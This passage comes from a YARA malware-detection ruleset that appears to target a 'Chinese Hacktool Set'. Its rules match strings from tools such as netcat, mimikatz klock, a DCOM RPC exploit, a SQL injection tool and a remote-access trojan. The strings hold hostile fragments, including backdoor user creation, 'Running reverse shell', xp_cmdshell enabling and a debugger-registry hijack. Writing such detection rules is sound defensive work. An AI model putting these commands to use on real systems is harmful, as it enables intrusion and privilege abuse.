tMd[CsP]\" fullword wide\n\t\t$s6 = \"\\\\\\\\.\\\\slIdtTool\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 25KB and all of them\n}\n\nrule GoodToolset_ms11046 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file ms11046.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"f8414a374011fd239a6c6d9c6ca5851cd8936409\"\n\tstrings:\n\t\t$s1 = \"[*] Token system command\" fullword ascii\n\t\t$s2 = \"[*] command add user 90sec 90sec\" fullword ascii\n\t\t$s3 = \"[*] Add to Administrators success\" fullword ascii\n\t\t$s4 = \"[*] User has been successfully added\" fullword ascii\n\t\t$s5 = \"Program: %s%s%s%s%s%s%s%s%s%s%s\" fullword ascii  /* Goodware String - occured 3 times */\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 840KB and 2 of them\n}\n\nrule Cmdshell32 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file Cmdshell32.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"3c41116d20e06dcb179e7346901c1c11cd81c596\"\n\tstrings:\n\t\t$s1 = \"cmdshell.exe\" fullword wide\n\t\t$s2 = \"cmdshell\" fullword ascii\n\t\t$s3 = \"[Root@CmdShell ~]#\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 62KB and all of them\n}\n\nrule Sniffer_analyzer_SSClone_1210_full_version {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file Sniffer analyzer SSClone 1210 full version.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"6882125babb60bd0a7b2f1943a40b965b7a03d4e\"\n\tstrings:\n\t\t$s0 = \"http://www.vip80000.com/hot/index.html\" fullword ascii\n\t\t$s1 = \"GetConnectString\" fullword ascii\n\t\t$s2 = \"CnCerT.Safe.SSClone.dll\" fullword ascii\n\t\t$s3 = \"(*.JPG;*.BMP;*.GIF;*.ICO;*.CUR)|*.JPG;*.BMP;*.GIF;*.ICO;*.CUR|JPG\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 3580KB and all of them\n}\n\nrule x64_klock {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file klock.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"44825e848bc3abdb6f31d0a49725bb6f498e9ccc\"\n\tstrings:\n\t\t$s1 = \"Bienvenue dans un processus distant\" fullword wide\n\t\t$s2 = \"klock.dll\" fullword ascii\n\t\t$s3 = \"Erreur : le bureau courant (\" fullword wide\n\t\t$s4 = \"klock de mimikatz pour Windows\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 907KB and all of them\n}\n\nrule Dos_Down32 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file Down32.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"0365738acd728021b0ea2967c867f1014fd7dd75\"\n\tstrings:\n\t\t$s2 = \"C:\\\\Windows\\\\Temp\\\\Cmd.txt\" fullword wide\n\t\t$s6 = \"down.exe\" fullword wide\n\t\t$s15 = \"get_Form1\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 137KB and all of them\n}\n\nrule MarathonTool_2 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file MarathonTool.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"75b5d25cdaa6a035981e5a33198fef0117c27c9c\"\n\tstrings:\n\t\t$s3 = \"http://localhost/retomysql/pista.aspx?id_pista=1\" fullword wide\n\t\t$s6 = \"SELECT ASCII(SUBSTR(username,{0},1)) FROM USER_USERS\" fullword wide\n\t\t$s17 = \"/Blind SQL injection tool based in heavy queries\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 1000KB and all of them\n}\n\nrule Tools_termsrv {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file termsrv.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"294a693d252f8f4c85ad92ee8c618cebd94ef247\"\n\tstrings:\n\t\t$s1 = \"Iv\\\\SmSsWinStationApiPort\" fullword ascii\n\t\t$s2 = \" TSInternetUser \" fullword wide\n\t\t$s3 = \"KvInterlockedCompareExchange\" fullword ascii\n\t\t$s4 = \" WINS/DNS \" fullword wide\n\t\t$s5 = \"winerror=%1\" fullword wide\n\t\t$s6 = \"TermService \" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 1150KB and all of them\n}\n\nrule scanms_scanms {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file scanms.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"47787dee6ddea2cb44ff27b6a5fd729273cea51a\"\n\tstrings:\n\t\t$s1 = \"--- ScanMs Tool --- (c) 2003 Internet Security Systems ---\" fullword ascii\n\t\t$s2 = \"Scans for systems vulnerable to MS03-026 vuln\" fullword ascii\n\t\t$s3 = \"More accurate for WinXP/Win2k, less accurate for WinNT\" fullword ascii /* PEStudio Blacklist: os */\n\t\t$s4 = \"added %d.%d.%d.%d-%d.%d.%d.%d\" fullword ascii\n\t\t$s5 = \"Internet Explorer 1.0\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 300KB and 3 of them\n}\n\nrule CN_Tools_PcShare {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file PcShare.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"ee7ba9784fae413d644cdf5a093bd93b73537652\"\n\tstrings:\n\t\t$s0 = \"title=%s%s-%s;id=%s;hwnd=%d;mainhwnd=%d;mainprocess=%d;cmd=%d;\" fullword wide\n\t\t$s1 = \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.1.4322)\" fullword wide\n\t\t$s2 = \"http://www.pcshares.cn/pcshare200/lostpass.asp\" fullword wide\n\t\t$s5 = \"port=%s;name=%s;pass=%s;\" fullword wide\n\t\t$s16 = \"%s\\\\ini\\\\*.dat\" fullword wide\n\t\t$s17 = \"pcinit.exe\" fullword wide\n\t\t$s18 = \"http://www.pcshare.cn\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 6000KB and 3 of them\n}\n\nrule pw_inspector {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file pw-inspector.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"4f8e3e101098fc3da65ed06117b3cb73c0a66215\"\n\tstrings:\n\t\t$s1 = \"-m MINLEN  minimum length of a valid password\" fullword ascii\n\t\t$s2 = \"http://www.thc.org\" fullword ascii\n\t\t$s3 = \"Use for hacking: trim your dictionary file to the pw requirements of the target.\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 460KB and all of them\n}\n\nrule Dll_LoadEx {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file Dll_LoadEx.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"213d9d0afb22fe723ff570cf69ff8cdb33ada150\"\n\tstrings:\n\t\t$s0 = \"WiNrOOt@126.com\" fullword wide\n\t\t$s1 = \"Dll_LoadEx.EXE\" fullword wide\n\t\t$s3 = \"You Already Loaded This DLL ! :(\" fullword ascii\n\t\t$s10 = \"Dll_LoadEx Microsoft \" fullword wide\n\t\t$s17 = \"Can't Load This Dll ! :(\" fullword ascii\n\t\t$s18 = \"WiNrOOt\" fullword wide\n\t\t$s20 = \" Dll_LoadEx(&A)...\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 120KB and 3 of them\n}\n\nrule dat_report {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file report.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"4582a7c1d499bb96dad8e9b227e9d5de9becdfc2\"\n\tstrings:\n\t\t$s1 = \"<a href=\\\"http://www.xfocus.net\\\">X-Scan</a>\" fullword ascii\n\t\t$s2 = \"REPORT-ANALYSIS-OF-HOST\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 480KB and all of them\n}\n\nrule Dos_iis7 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file iis7.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"0a173c5ece2fd4ac8ecf9510e48e95f43ab68978\"\n\tstrings:\n\t\t$s0 = \"\\\\\\\\localhost\" fullword ascii\n\t\t$s1 = \"iis.run\" fullword ascii\n\t\t$s3 = \">Could not connecto %s\" fullword ascii\n\t\t$s5 = \"WHOAMI\" ascii\n\t\t$s13 = \"WinSta0\\\\Default\" fullword ascii  /* Goodware String - occured 22 times */\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 140KB and all of them\n}\n\nrule SwitchSniffer {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file SwitchSniffer.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"1e7507162154f67dff4417f1f5d18b4ade5cf0cd\"\n\tstrings:\n\t\t$s0 = \"NextSecurity.NET\" fullword wide\n\t\t$s2 = \"SwitchSniffer Setup\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and all of them\n}\n\nrule dbexpora {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file dbexpora.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"b55b007ef091b2f33f7042814614564625a8c79f\"\n\tstrings:\n\t\t$s0 = \"SELECT A.USER FROM SYS.USER_USERS A \" fullword ascii\n\t\t$s12 = \"OCI 8 - OCIDescriptorFree\" fullword ascii\n\t\t$s13 = \"ORACommand *\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 835KB and all of them\n}\n\nrule SQLCracker {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file SQLCracker.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"1aa5755da1a9b050c4c49fc5c58fa133b8380410\"\n\tstrings:\n\t\t$s0 = \"msvbvm60.dll\" fullword ascii /* reversed goodware string 'lld.06mvbvsm' */\n\t\t$s1 = \"_CIcos\" fullword ascii\n\t\t$s2 = \"kernel32.dll\" fullword ascii\n\t\t$s3 = \"cKmhV\" fullword ascii\n\t\t$s4 = \"080404B0\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 125KB and all of them\n}\n\nrule FreeVersion_debug {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file debug.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"d11e6c6f675b3be86e37e50184dadf0081506a89\"\n\tstrings:\n\t\t$s0 = \"c:\\\\Documents and Settings\\\\Administrator\\\\\" fullword ascii\n\t\t$s1 = \"Got WMI process Pid: %d\" ascii\n\t\t$s2 = \"This exploit will execute\" ascii\n\t\t$s6 = \"Found token %s \" ascii\n\t\t$s7 = \"Running reverse shell\" ascii\n\t\t$s10 = \"wmiprvse.exe\" fullword ascii\n\t\t$s12 = \"SELECT * FROM IIsWebInfo\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 820KB and 3 of them\n}\n\nrule Dos_look {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file look.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"e1a37f31170e812185cf00a838835ee59b8f64ba\"\n\tstrings:\n\t\t$s1 = \"<description>CHKen QQ:41901298</description>\" fullword ascii\n\t\t$s2 = \"version=\\\"9.9.9.9\\\"\" fullword ascii\n\t\t$s3 = \"name=\\\"CH.Ken.Tool\\\"\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 40KB and all of them\n}\n\nrule NtGodMode {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file NtGodMode.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"8baac735e37523d28fdb6e736d03c67274f7db77\"\n\tstrings:\n\t\t$s0 = \"to HOST!\" fullword ascii\n\t\t$s1 = \"SS.EXE\" fullword ascii\n\t\t$s5 = \"lstrlen0\" fullword ascii\n\t\t$s6 = \"Virtual\" fullword ascii  /* Goodware String - occured 6 times */\n\t\t$s19 = \"RtlUnw\" fullword ascii /* Goodware String - occured 1 times */\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 45KB and all of them\n}\n\nrule Dos_NC {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file NC.EXE\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"57f0839433234285cc9df96198a6ca58248a4707\"\n\tstrings:\n\t\t$s1 = \"nc -l -p port [options] [hostname] [port]\" fullword ascii\n\t\t$s2 = \"invalid connection to [%s] from %s [%s] %d\" fullword ascii\n\t\t$s3 = \"post-rcv getsockname failed\" fullword ascii\n\t\t$s4 = \"Failed to execute shell, error = %s\" fullword ascii\n\t\t$s5 = \"UDP listen needs -p arg\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 290KB and all of them\n}\n\nrule WebCrack4_RouterPasswordCracking {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file WebCrack4-RouterPasswordCracking.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"00c68d1b1aa655dfd5bb693c13cdda9dbd34c638\"\n\tstrings:\n\t\t$s0 = \"http://www.site.com/test.dll?user=%USERNAME&pass=%PASSWORD\" fullword ascii\n\t\t$s1 = \"Username: \\\"%s\\\", Password: \\\"%s\\\", Remarks: \\\"%s\\\"\" fullword ascii\n\t\t$s14 = \"user:\\\"%s\\\" pass: \\\"%s\\\" result=\\\"%s\\\"\" fullword ascii\n\t\t$s16 = \"Mozilla/4.0 (compatible; MSIE 4.01; Windows NT)\" fullword ascii\n\t\t$s20 = \"List count out of bounds (%d)+Operation not allowed on sorted string list%String\" wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 5000KB and 2 of them\n}\n\nrule HScan_v1_20_oncrpc {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file oncrpc.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"e8f047eed8d4f6d2f5dbaffdd0e6e4a09c5298a2\"\n\tstrings:\n\t\t$s1 = \"clnt_raw.c - Fatal header serialization error.\" fullword ascii\n\t\t$s2 = \"svctcp_.c - cannot getsockname or listen\" fullword ascii\n\t\t$s3 = \"too many connections (%d), compilation constant FD_SETSIZE was only %d\" fullword ascii\n\t\t$s4 = \"svc_run: - select failed\" fullword ascii\n\t\t$s5 = \"@(#)bindresvport.c\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 340KB and 4 of them\n}\n\nrule hscan_gui {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file hscan-gui.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"1885f0b7be87f51c304b39bc04b9423539825c69\"\n\tstrings:\n\t\t$s0 = \"Hscan.EXE\" fullword wide\n\t\t$s1 = \"RestTool.EXE\" fullword ascii\n\t\t$s3 = \"Hscan Application \" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 550KB and all of them\n}\n\nrule S_MultiFunction_Scanners_s {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file s.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"79b60ffa1c0f73b3c47e72118e0f600fcd86b355\"\n\tstrings:\n\t\t$s0 = \"C:\\\\WINDOWS\\\\temp\\\\pojie.exe /l=\" fullword ascii\n\t\t$s1 = \"C:\\\\WINDOWS\\\\temp\\\\s.exe\" fullword ascii\n\t\t$s2 = \"C:\\\\WINDOWS\\\\temp\\\\s.exe tcp \" fullword ascii\n\t\t$s3 = \"explorer.exe http://www.hackdos.com\" fullword ascii\n\t\t$s4 = \"C:\\\\WINDOWS\\\\temp\\\\pojie.exe\" fullword ascii\n\t\t$s5 = \"Failed to read file or invalid data in file!\" fullword ascii\n\t\t$s6 = \"www.hackdos.com\" fullword ascii\n\t\t$s7 = \"WTNE / MADE BY E COMPILER - WUTAO \" fullword ascii\n\t\t$s11 = \"The interface of kernel library is invalid!\" fullword ascii\n\t\t$s12 = \"eventvwr\" fullword ascii\n\t\t$s13 = \"Failed to decompress data!\" fullword ascii\n\t\t$s14 = \"NOTEPAD.EXE result.txt\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 8000KB and 4 of them\n}\n\nrule Dos_GetPass {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file GetPass.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"d18d952b24110b83abd17e042f9deee679de6a1a\"\n\tstrings:\n\t\t$s0 = \"GetLogonS\" ascii\n\t\t$s3 = \"/showthread.php?t=156643\" ascii\n\t\t$s8 = \"To Run As Administ\" ascii\n\t\t$s18 = \"EnableDebugPrivileg\" fullword ascii\n\t\t$s19 = \"sedebugnameValue\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 890KB and all of them\n}\n\nrule update_PcMain {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file PcMain.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"aa68323aaec0269b0f7e697e69cce4d00a949caa\"\n\tstrings:\n\t\t$s0 = \"User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.2; .NET CLR 1.1.4322\" ascii\n\t\t$s1 = \"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\SvcHost\" fullword ascii\n\t\t$s2 = \"SOFTWARE\\\\Classes\\\\HTTP\\\\shell\\\\open\\\\command\" fullword ascii\n\t\t$s3 = \"\\\\svchost.exe -k \" fullword ascii\n\t\t$s4 = \"SYSTEM\\\\ControlSet001\\\\Services\\\\%s\" fullword ascii\n\t\t$s9 = \"Global\\\\%s-key-event\" fullword ascii\n\t\t$s10 = \"%d%d.exe\" fullword ascii\n\t\t$s14 = \"%d.exe\" fullword ascii\n\t\t$s15 = \"Global\\\\%s-key-metux\" fullword ascii\n\t\t$s18 = \"GET / HTTP/1.1\" fullword ascii\n\t\t$s19 = \"\\\\Services\\\\\" fullword ascii\n\t\t$s20 = \"qy001id=%d;qy001guid=%s\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 500KB and 4 of them\n}\n\nrule Dos_sys {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file sys.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"b5837047443f8bc62284a0045982aaae8bab6f18\"\n\tstrings:\n\t\t$s0 = \"'SeDebugPrivilegeOpen \" fullword ascii\n\t\t$s6 = \"Author: Cyg07*2\" fullword ascii\n\t\t$s12 = \"from golds7n[LAG]'J\" fullword ascii\n\t\t$s14 = \"DAMAGE\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 150KB and all of them\n}\n\nrule dat_xpf {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file xpf.sys\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"761125ab594f8dc996da4ce8ce50deba49c81846\"\n\tstrings:\n\t\t$s1 = \"UnHook IoGetDeviceObjectPointer ok!\" fullword ascii\n\t\t$s2 = \"\\\\Device\\\\XScanPF\" fullword wide\n\t\t$s3 = \"\\\\DosDevices\\\\XScanPF\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 25KB and all of them\n}\n\nrule Project1 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file Project1.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"d1a5e3b646a16a7fcccf03759bd0f96480111c96\"\n\tstrings:\n\t\t$s1 = \"EXEC master.dbo.sp_addextendedproc 'xp_cmdshell','xplog70.dll'\" fullword ascii\n\t\t$s2 = \"Password.txt\" fullword ascii\n\t\t$s3 = \"LoginPrompt\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 5000KB and all of them\n}\n\nrule Arp_EMP_v1_0 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file Arp EMP v1.0.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"ae4954c142ad1552a2abaef5636c7ef68fdd99ee\"\n\tstrings:\n\t\t$s0 = \"Arp EMP v1.0.exe\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 800KB and all of them\n}\n\nrule CN_Tools_MyUPnP {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file MyUPnP.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"15b6fca7e42cd2800ba82c739552e7ffee967000\"\n\tstrings:\n\t\t$s1 = \"<description>BYTELINKER.COM</description>\" fullword ascii\n\t\t$s2 = \"myupnp.exe\" fullword ascii\n\t\t$s3 = \"LOADER ERROR\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 1500KB and all of them\n}\n\nrule CN_Tools_Shiell {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file Shiell.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"b432d80c37abe354d344b949c8730929d8f9817a\"\n\tstrings:\n\t\t$s1 = \"C:\\\\Users\\\\Tong\\\\Documents\\\\Visual Studio 2012\\\\Projects\\\\Shift shell\" ascii\n\t\t$s2 = \"C:\\\\Windows\\\\System32\\\\Shiell.exe\" fullword wide\n\t\t$s3 = \"Shift shell.exe\" fullword wide\n\t\t$s4 = \"\\\" /v debugger /t REG_SZ /d \\\"\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 1500KB and 2 of them\n}\n\nrule cndcom_cndcom {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file cndcom.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"08bbe6312342b28b43201125bd8c518531de8082\"\n\tstrings:\n\t\t$s1 = \"- Rewritten by HDM last <hdm [at] metasploit.com>\" fullword ascii\n\t\t$s2 = \"- Usage: %s <Target ID> <Target IP>\" fullword ascii\n\t\t$s3 = \"- Remote DCOM RPC Buffer Overflow Exploit\" fullword ascii\n\t\t$s4 = \"- Warning:This Code is more like a dos tool!(Modify by pingker)\" fullword ascii\n\t\t$s5 = \"Windows NT SP6 (Chinese)\" fullword ascii\n\t\t$s6 = \"- Original code by FlashSky and Benjurry\" fullword ascii\n\t\t$s7 = \"\\\\C$\\\\123456111111111111111.doc\" fullword wide\n\t\t$s8 = \"shell3all.c\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 100KB and 2 of them\n}\n\nrule IsDebug_V1_4 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file IsDebug V1.4.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"ca32474c358b4402421ece1cb31714fbb088b69a\"\n\tstrings:\n\t\t$s0 = \"IsDebug.dll\" fullword ascii\n\t\t$s1 = \"SV Dumper V1.0\" fullword wide\n\t\t$s2 = \"(IsDebuggerPresent byte Patcher)\" fullword ascii\n\t\t$s8 = \"Error WriteMemory failed\" fullword ascii\n\t\t$s9 = \"IsDebugPresent\" fullword ascii\n\t\t$s10 = \"idb_Autoload\" fullword ascii\n\t\t$s11 = \"Bin Files\" fullword ascii\n\t\t$s12 = \"MASM32 version\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 30KB and all of them\n}\n\nrule HTTPSCANNER {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file HTTPSCANNER.EXE\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"ae2929346944c1ea3411a4562e9d5e2f765d088a\"\n\tstrings:\n\t\t$s1 = \"HttpScanner.exe\" fullword wide\n\t\t$s2 = \"HttpScanner\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 3500KB and all of them\n}\n\nrule HScan_v1_20_PipeCmd {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file PipeCmd.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"64403ce63b28b544646a30da3be2f395788542d6\"\n\tstrings:\n\t\t$s1 = \"%SystemRoot%\\\\system32\\\\PipeCmdSrv.exe\" fullword ascii\n\t\t$s2 = \"PipeCmd.exe\" fullword wide\n\t\t$s3 = \"Please Use NTCmd.exe Run This Program.\" fullword ascii\n\t\t$s4 = \"%s\\\\pipe\\\\%s%s%d\" fullword ascii\n\t\t$s5 = \"\\\\\\\\.\\\\pipe\\\\%s%s%d\" fullword ascii\n\t\t$s6 = \"%s\\\\ADMIN$\\\\System32\\\\%s%s\" fullword ascii\n\t\t$s7 = \"This is a service executable! Couldn't start directly.\" fullword ascii\n\t\t$s8 = \"Connecting to Remote Server ...Failed\" fullword ascii\n\t\t$s9 = \"PIPECMDSRV\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 200KB and 4 of them\n}\n\nrule Dos_fp {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file fp.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"41d57d356098ff55fe0e1f0bcaa9317df5a2a45c\"\n\tstrings:\n\t\t$s1 = \"fpipe -l 53 -s 53 -r 80 192.168.1.101\" fullword ascii\n\t\t$s2 = \"FPipe.exe\" fullword wide\n\t\t$s3 = \"http://www.foundstone.com\" fullword ascii\n\t\t$s4 = \"%s %s port %d. Address is already in use\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 65KB and all of them\n}\n\nrule Dos_netstat {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file netstat.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"d0444b7bd936b5fc490b865a604e97c22d97e598\"\n\tstrings:\n\t\t$s0 = \"w03a2409.dll\" fullword ascii\n\t\t$s1 = \"Retransmission Timeout Algorithm    = unknown (%1!u!)\" fullword wide  /* Goodware String - occured 2 times */\n\t\t$s2 = \"Administrative Status  = %1!u!\" fullword wide  /* Goodware String - occured 2 times */\n\t\t$s3 = \"Packet Too Big            %1!-10u!  %2!-10u!\" fullword wide  /* Goodware String - occured 2 times */\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 150KB and all of them\n}\n\nrule CN_Tools_xsniff 